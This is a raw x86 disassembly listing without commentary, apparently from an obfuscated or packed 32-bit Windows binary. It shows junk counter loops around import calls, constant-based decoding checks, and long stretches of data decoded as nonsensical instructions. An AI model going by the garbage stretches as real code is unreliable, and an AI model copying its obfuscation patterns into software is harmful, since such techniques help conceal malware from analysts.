  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	xchg   ebp,eax
  407c4b:	bound  ebp,QWORD PTR ds:0x7ecc2bd4
  407c51:	jle    0x407c58
  407c53:	jl     0x407cd3
  407c55:	jle    0x407c16
  407c57:	jbe    0x407c7b
  407c59:	dec    edx
  407c5a:	ret    0x9d5
  407c5d:	cmc    
  407c5e:	cld    
  407c5f:	inc    ebp
  407c60:	shl    BYTE PTR [eax-0x1c],0x8
  407c64:	add    eax,0xab8276d2
  407c69:	jb     0x407c3e
  407c6b:	jae    0x407cd9
  407c6d:	mov    ch,dl
  407c6f:	dec    ebp
  407c70:	cdq    
  407c71:	fisttp QWORD PTR [edi+0x14]
  407c74:	dec    ebx
  407c75:	fcomp  st(3)
  407c77:	mov    ecx,0x2c8e44b4
  407c7c:	test   eax,0x37213586
  407c81:	mov    bl,0x18
  407c83:	lods   eax,DWORD PTR ds:[esi]
  407c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c85:	add    ebx,eax
  407c87:	pop    ss
  407c88:	into   
  407c89:	mov    ch,0x2d
  407c8b:	in     eax,dx
  407c8c:	retf   0xef18
  407c8f:	or     BYTE PTR [ecx],0x91
  407c92:	fcomp  st(3)
  407c94:	or     al,0xf4
  407c96:	add    BYTE PTR [edx-0x2c],dh
  407c99:	adc    al,0xff
  407c9b:	sub    esp,DWORD PTR [eax+0x10]
  407c9e:	or     eax,DWORD PTR [ebp+0x6ee6a96c]
  407ca4:	data16 jbe 0x407cba
  407ca7:	add    bh,cl
  407ca9:	clc    
  407caa:	inc    ecx
  407cab:	sbb    ebp,DWORD PTR [ecx]
  407cad:	and    edx,0x34
  407cb0:	out    0x39,eax
  407cb2:	cdq    
  407cb3:	mov    esp,0x81c277fb
  407cb8:	sbb    al,al
  407cba:	sbb    al,0xde
  407cbc:	sbb    eax,0x12f4d887
  407cc1:	scas   eax,DWORD PTR es:[edi]
  407cc2:	mov    ah,BYTE PTR [edi+0x4d2a9add]
  407cc8:	int    0xcd
  407cca:	fcom   QWORD PTR ds:0xecba5d1d
  407cd0:	add    BYTE PTR [edi+0x2c17c46b],dl
  407cd6:	(bad)  
  407cd7:	pop    edx
  407cd8:	jge    0x407c7a
  407cda:	ret    
  407cdb:	sub    eax,DWORD PTR [edi+0x5f]
  407cde:	pop    eax
  407cdf:	cmp    dh,BYTE PTR [ebx+0x74]
  407ce2:	xchg   esi,eax
  407ce3:	enter  0xbdf7,0x7b
  407ce7:	jge    0x407cb6
  407ce9:	mov    eax,0xdd90c298
  407cee:	mov    dh,0x3f
  407cf0:	mov    dl,0xef
  407cf2:	pop    ebx
  407cf3:	test   al,0x4a
  407cf5:	mov    ebp,0x670a0b38
  407cfa:	out    dx,eax
  407cfb:	dec    ebp
  407cfc:	in     eax,0xfe
  407cfe:	pop    ds
  407cff:	jg     0x407cff
  407d01:	loopne 0x407cf1
  407d03:	cwde   
  407d04:	stos   WORD PTR es:[edi],ax
  407d06:	in     al,0x77
  407d08:	shr    eax,cl
  407d0a:	sbb    DWORD PTR [ebx+esi*2+0x78],ecx
  407d0e:	mov    BYTE PTR [ebp+esi*2+0x4a],bl
  407d12:	add    ah,bl
  407d14:	gs ins DWORD PTR es:[edi],dx
  407d16:	into   
  407d17:	mov    ds:0x53dda973,eax
  407d1c:	in     eax,dx
  407d1d:	ret    
  407d1e:	test   ebx,eax
  407d20:	mov    edx,0x13788f5b
  407d25:	jno    0x407cc0
  407d27:	cmp    BYTE PTR [esp+eiz*4],al
  407d2a:	shl    DWORD PTR [eax],0xc6
  407d2d:	mov    ?,WORD PTR [edi+0x54]
  407d30:	inc    edx
  407d31:	and    bh,ch
  407d33:	das    
  407d34:	jecxz  0x407cbd
  407d36:	mov    eax,ds:0xda48f703
  407d3b:	inc    esp
  407d3c:	mov    al,ds:0x6252febb
  407d41:	fwait
  407d42:	dec    DWORD PTR [esi]
  407d44:	iret   
  407d45:	push   esp
  407d46:	jo     0x407d8c
  407d48:	xchg   ecx,eax
  407d49:	shr    BYTE PTR [ebp+0x7d2594e2],0xba
  407d50:	xor    ebx,esi
  407d52:	shr    DWORD PTR [ebx-0x1c77a1c5],1
  407d58:	lea    ebp,[esi]
  407d5a:	lock lock stc 
  407d5d:	cs js  0x407d38
  407d60:	add    BYTE PTR [ecx],al
  407d62:	test   BYTE PTR [ecx+eax*4],0x5b
  407d66:	xchg   esp,eax
  407d67:	adc    eax,0x101d2ac3
  407d6c:	push   cs
  407d6d:	xor    edi,DWORD PTR [ebp-0x51c072f2]
  407d73:	cli    
  407d74:	xchg   DWORD PTR [edx-0x39],ebx
  407d77:	leave  
  407d78:	inc    edx
  407d79:	xor    al,0x66
  407d7b:	ficom  WORD PTR [edi]
  407d7d:	sbb    BYTE PTR [esi+0x9],ch
  407d80:	outs   dx,DWORD PTR ds:[esi]
  407d81:	leave  
  407d82:	cmp    eax,0x3d31b777
  407d87:	pop    eax
  407d88:	inc    esi
  407d89:	dec    edx
  407d8a:	imul   edx,DWORD PTR fs:[edx-0x21e07738],0xb7457c2d
  407d95:	mov    ah,0xa9
  407d97:	sbb    bl,BYTE PTR ds:[ebp+0x76]
  407d9b:	dec    ebx
  407d9c:	lods   al,BYTE PTR ds:[esi]
  407d9d:	jle    0x407de5
  407d9f:	mov    es:0x9cf8a140,eax
  407da5:	pop    ebp
  407da6:	cmc    
  407da7:	ss inc ebx
  407da9:	ss iret 
  407dab:	mov    DWORD PTR [eax+ecx*4],0xaec5d338
  407db2:	add    dh,BYTE PTR [edx]
  407db4:	push   0xffffffb8
  407db6:	xor    DWORD PTR [edi+edx*8+0x6e50706],eax
  407dbd:	push   es
  407dbe:	pop    edi
  407dbf:	(bad)  
  407dc0:	jecxz  0x407d56
  407dc2:	sbb    DWORD PTR [eax+eiz*2-0x5a98156],0x3fd9c627
  407dcd:	jnp    0x407d96
  407dcf:	addr16 inc esp
  407dd1:	jno    0x407da6
  407dd3:	push   ecx
  407dd4:	push   ss
  407dd5:	rcl    BYTE PTR [esi-0x79495527],1
  407ddb:	outs   dx,DWORD PTR ds:[esi]
  407ddc:	(bad)
  407de0:	nop
  407de1:	xor    al,0xea
  407de3:	cmp    dh,dl
  407de5:	sbb    bh,bh
  407de7:	test   al,0x2
  407de9:	ss pop ebx
  407deb:	(bad)  
  407dec:	mov    dl,0x85
  407dee:	js     0x407dfc
  407df0:	stos   DWORD PTR es:[edi],eax
  407df1:	(bad)  
  407df2:	jmp    0x407e6a
  407df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df5:	sbb    BYTE PTR [edx+0x37],cl
  407df8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df9:	push   ebx
  407dfa:	xchg   ecx,eax
  407dfb:	xchg   ebx,eax
  407dfc:	dec    esp
  407dfd:	add    bl,ah
  407dff:	add    cl,BYTE PTR [edx-0x465b8bfc]
  407e05:	inc    ebx
  407e06:	shl    DWORD PTR [ebp-0x7c90f2d9],0x43
  407e0d:	dec    edi
  407e0e:	stos   DWORD PTR es:[edi],eax
  407e0f:	xor    al,0x52
  407e11:	mov    ch,cl
  407e13:	(bad)  
  407e14:	das    
  407e15:	lods   al,BYTE PTR ds:[esi]
  407e16:	inc    ebx
  407e17:	inc    ebp
  407e18:	lods   eax,DWORD PTR ds:[esi]
  407e19:	cmp    BYTE PTR [edx+0x27],dl
  407e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e1d:	fist   WORD PTR [eax-0xc489c16]
  407e23:	push   ecx
  407e24:	pusha  
  407e25:	mov    ch,0x31
  407e27:	fisubr WORD PTR [eax-0x169c1d2]
  407e2d:	and    eax,DWORD PTR [edx]
  407e2f:	sbb    ebx,DWORD PTR [ecx+0x24862f53]
  407e35:	imul   edi,DWORD PTR [ebp+ebx*4-0x2a],0x3
  407e3a:	inc    ebp
  407e3b:	cdq    
  407e3c:	mov    esp,0x32817d09
  407e41:	ja     0x407e08
  407e43:	xchg   edi,eax
  407e44:	cdq    
  407e45:	sub    esi,edi
  407e47:	out    dx,eax
  407e48:	add    DWORD PTR [ebx+0x444c1e7b],esp
  407e4e:	or     eax,DWORD PTR [esi-0x61]
  407e51:	mov    edx,0x58fbd26
  407e56:	outs   dx,BYTE PTR ds:[esi]
  407e57:	cmp    al,0x11
  407e59:	jge    0x407e44
  407e5b:	into   
  407e5c:	aas    
  407e5d:	lods   eax,DWORD PTR ds:[esi]
  407e5e:	adc    ch,BYTE PTR [ecx-0x74ef769a]
  407e64:	inc    ebp
  407e65:	hlt    
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x89f5a00d
  408191:	inc    esp
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	mov    al,ds:0xa1438cae
  40819f:	cmp    BYTE PTR [edx+0x15],0x88
  4081a3:	push   cs
  4081a4:	lea    edi,[ecx-0x16]
  4081a7:	or     al,0x45
  4081a9:	retf   0xc209
  4081ac:	mov    WORD PTR [edi],ds
  4081ae:	mov    esp,0xdab32cbd
  4081b3:	lock xchg ecx,eax
  4081b5:	jno    0x40813b
  4081b7:	mov    bl,0xe5
  4081b9:	inc    esp
  4081ba:	pop    es
  4081bb:	nop
  4081bc:	mov    ebx,0x6ba68300
  4081c1:	mov    dh,0xc3
  4081c3:	dec    esp
  4081c4:	in     eax,0x2a
  4081c6:	(bad)  
  4081c8:	ins    DWORD PTR es:[edi],dx
  4081c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ca:	xor    eax,0xe0149928
  4081cf:	lds    esp,FWORD PTR [ebx+0x20ef28a5]
  4081d5:	or     esi,DWORD PTR [esi+edi*2+0x7a]
  4081d9:	inc    edi
  4081da:	xor    eax,0x19adc896
  4081df:	sbb    esp,DWORD PTR [edx-0x3d]
  4081e2:	(bad)  
  4081e3:	in     eax,dx
  4081e4:	fstp   DWORD PTR [ecx+esi*4+0x33d957f1]
  4081eb:	scas   eax,DWORD PTR es:[edi]
  4081ec:	sbb    ecx,ebp
  4081ee:	das    
  4081ef:	inc    ebx
  4081f0:	push   esi
  4081f1:	popa   
  4081f2:	frstor [ebx-0x69ff91]
  4081f8:	gs pusha 
  4081fa:	aam    0xa5
  4081fc:	cwde   
  4081fd:	push   edi
  4081fe:	add    esi,ebx
  408200:	jmp    0x4081e3
  408202:	cmc    
  408203:	add    al,BYTE PTR [ebp+0x4e]
  408206:	aaa    
  408207:	pop    ss
  408208:	sub    edx,edx
  40820a:	and    ecx,DWORD PTR [ecx+0xc839af5]
  408210:	mov    dh,0xd7
  408212:	mov    ds:0x611c77ab,al
  408217:	mov    DWORD PTR ds:0xa3b872ba,esp
  40821d:	mov    eax,0xf7e6515e
  408222:	aaa    
  408223:	inc    sp
  408225:	push   ds
  408226:	sar    BYTE PTR [esi],0xd9
  408229:	jb     0x4081b5
  40822b:	adc    eax,0xa2be2216
  408230:	jb     0x4081e8
  408232:	cmp    eax,0x3a12f580
  408237:	cmp    DWORD PTR [eax],eax
  408239:	adc    DWORD PTR [esp+eax*1],esi
  40823c:	push   esi
  40823d:	and    BYTE PTR [edx],ch
  40823f:	or     esp,DWORD PTR [eax]
  408241:	sbb    DWORD PTR [edx],edi
  408243:	adc    al,0x9b
  408245:	push   edi
  408246:	ds rol esi,cl
  408249:	add    ebp,DWORD PTR [eax-0x75]
  40824c:	mov    al,ds:0x9bf296d2
  408251:	imul   esi,edx,0x1befbe2a
  408257:	xchg   ebp,eax
  408258:	pop    ds
  408259:	fistp  QWORD PTR [edx-0x2e]
  40825c:	cld    
  40825d:	jp     0x40825d
  40825f:	dec    esi
  408260:	(bad)  
  408261:	cmp    edx,DWORD PTR [ebx+0x2d]
  408264:	adc    eax,0x831ba7a7
  408269:	jmp    FWORD PTR [eax]
  40826b:	hlt    
  40826c:	jmp    0x4d2b3b90
  408271:	ret    
  408272:	inc    esp
  408273:	fbstp  TBYTE PTR [esi+0x6fef776e]
  408279:	add    al,0x75
  40827b:	mov    dh,0xe7
  40827d:	ins    DWORD PTR es:[edi],dx
  40827e:	mov    bh,0x7a
  408280:	push   edi
  408281:	inc    ebx
  408282:	sahf   
  408283:	jg     0x4082a5
  408285:	aas    
  408286:	and    edi,DWORD PTR [edx+0x30]
  408289:	cwde   
  40828a:	pop    DWORD PTR [ebx]
  40828c:	and    BYTE PTR [ecx],0x48
  40828f:	je     0x408211
  408291:	retf   
  408292:	or     DWORD PTR ds:0x169ffae8,edi
  408298:	loop   0x408254
  40829a:	xchg   edx,eax
  40829b:	mov    bl,0x1f
  40829d:	repz jl 0x408317
  4082a0:	jb     0x4082af
  4082a2:	or     al,0x6
  4082a4:	out    0x8d,al
  4082a6:	push   0xb
  4082a8:	shl    DWORD PTR [edx],cl
  4082aa:	add    DWORD PTR ds:0xad95318e,0xffffffea
  4082b1:	jne    0x4082f5
  4082b3:	test   BYTE PTR [esi],ah
  4082b5:	shl    BYTE PTR [ecx-0x5d],0x5c
  4082b9:	push   ss
  4082ba:	cmp    BYTE PTR [eax-0x7c061e2f],al
  4082c0:	fst    QWORD PTR [edx+ebp*4-0x40f8ca5d]
  4082c7:	call   0x6e70:0x6f71ddc7
  4082ce:	mov    ch,0xc6
  4082d0:	push   ss
  4082d1:	fnstcw WORD PTR [ecx+0x7ea3a06b]
  4082d7:	pusha  
  4082d8:	int3   
  4082d9:	jno    0x408321
  4082db:	sbb    ebp,DWORD PTR [eax]
  4082dd:	mov    ch,dh
  4082df:	mov    ebx,0xd8ff108a
  4082e4:	aam    0x46
  4082e6:	imul   ebx,esp,0xa4880c92
  4082ec:	sbb    cl,cl
  4082ee:	arpl   WORD PTR [edi],si
  4082f0:	mov    dl,0x80
  4082f2:	das    
  4082f3:	call   0x84dc8153
  4082f8:	sub    eax,0x971184c6
  4082fd:	push   0x1867eaf2
  408302:	jmp    0x6f8cddcf
  408307:	sub    al,0x7b
  408309:	aaa    
  40830a:	jbe    0x4082f4
  40830c:	lock add ch,BYTE PTR [esi+ecx*2+0x67bc1a29]
  408314:	sub    al,0xb7
  408316:	xchg   esp,eax
  408317:	lea    edi,[ebx+eax*4-0x1b]
  40831b:	xor    ah,cl
  40831d:	fiadd  DWORD PTR [esi]
  40831f:	in     eax,dx
  408320:	and    dh,BYTE PTR [edi+edi*8]
  408323:	or     BYTE PTR ds:0xf143a9e3,dl
  408329:	add    al,0xc6
  40832b:	jge    0x408333
  40832d:	xchg   ecx,eax
  40832e:	aas    
  40832f:	adc    al,0x94
  408331:	ds aas 
  408333:	cmp    ah,BYTE PTR [ecx-0x430cf42]
  408339:	push   es
  40833a:	inc    ecx
  40833b:	push   edi
  40833c:	pop    ebp
  40833d:	dec    ebx
  40833e:	aas    
  40833f:	pop    esp
  408340:	jle    0x408332
  408342:	lods   al,BYTE PTR ds:[esi]
  408343:	neg    BYTE PTR [ebp-0x74]
  408346:	ret    
  408347:	fcom   QWORD PTR [eax-0x54e02327]
  40834d:	push   esi
  40834e:	and    al,BYTE PTR [ebx]
  408350:	inc    edx
  408351:	(bad)  
  408352:	xchg   edx,eax
  408353:	or     DWORD PTR [ecx+0x5d],esi
  408356:	fcomp  DWORD PTR [esi-0x20]
  408359:	retf   0x95f3
  40835c:	in     al,dx
  40835d:	popf   
  40835e:	adc    eax,0x46a6be0e
  408363:	test   DWORD PTR [eax],0xfe8d0d77
  408369:	js     0x4083a5
  40836b:	test   eax,0xc8b29574
  408370:	clc    
  408371:	jmp    0x4083cc
  408373:	pusha  
  408374:	in     eax,0xad
  408376:	nop
  408377:	sbb    ebx,DWORD PTR [ebx+0x2c]
  40837a:	pusha  
  40837b:	jbe    0x408311
  40837d:	sub    BYTE PTR [ecx],ch
  40837f:	in     eax,dx
  408380:	cmp    ah,BYTE PTR [ebx+0x13]
  408383:	jnp    0x40832d
  408385:	shl    eax,0x1f
  408388:	cmp    al,0xf4
  40838a:	ds cs clc 
  40838d:	scas   al,BYTE PTR es:[edi]
  40838e:	jbe    0x4083cb
  408390:	mov    ebp,0xe60161be
  408395:	sub    dh,bl
  408397:	xchg   ebp,eax
  408398:	sbb    DWORD PTR [ebx],esi
  40839a:	adc    BYTE PTR [ecx],ch
  40839c:	pop    ebx
  40839d:	add    BYTE PTR [esi],dl
  40839f:	push   es
  4083a0:	cmp    ecx,DWORD PTR [edi+0x116414e4]
  4083a6:	jne    0x408372
  4083a8:	push   0x80b143d6
  4083ad:	jmp    0x4083ce
  4083af:	add    DWORD PTR [eax+edi*8],esp
  4083b2:	xchg   edi,eax
  4083b3:	push   cs
  4083b4:	lahf   
  4083b5:	pop    eax
  4083b7:	push   es
  4083b8:	(bad)  
  4083b9:	dec    ecx
  4083ba:	shr    esi,cl
  4083bc:	xchg   edi,eax
  4083bd:	ret    0x240f
  4083c0:	fisubr WORD PTR [esi+esi*8-0x39]
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x4337db,0x0
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	dec    esi
  408465:	add    eax,0xc8e4f3d3
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	dec    ecx
  408471:	adc    dh,BYTE PTR [edi]
  408473:	jle    0x40845b
  408475:	outs   dx,DWORD PTR ds:[esi]
  408476:	mov    al,ds:0x200766c4
  40847b:	popf   
  40847c:	add    cl,0x2d
  40847f:	(bad)  
  408480:	rcr    eax,1
  408482:	aas    
  408483:	ret    0xb9f
  408486:	sti    
  408487:	test   BYTE PTR [eax],ah
  408489:	jno    0x4084cf
  40848b:	xchg   esp,eax
  40848c:	mov    DWORD PTR [ebx],ebx
  40848e:	xchg   ebx,eax
  40848f:	adc    ebp,edx
  408491:	mov    esp,0x106e1534
  408496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408497:	leave  
  408498:	repnz add bl,dl
  40849b:	push   edi
  40849c:	int3   
  40849d:	iret   
  40849e:	jnp    0x4084ab
  4084a0:	mov    edi,0xcc356d9b
  4084a5:	sbb    al,0x44
  4084a7:	div    ch
  4084a9:	inc    edx
  4084aa:	cmp    al,0x60
  4084ac:	daa    
  4084ad:	scas   al,BYTE PTR es:[edi]
  4084ae:	cld    
  4084af:	ror    BYTE PTR [eax+0x1246cf96],cl
  4084b5:	mov    eax,ds:0x3ca953a1
  4084ba:	repz imul DWORD PTR [ebx]
  4084bd:	dec    eax
  4084be:	test   BYTE PTR [ecx+0x746d3144],al
  4084c4:	mov    dl,BYTE PTR [ebx+0x223cf08b]
  4084ca:	add    eax,0x4d299752
  4084cf:	test   eax,0xc2e828ef
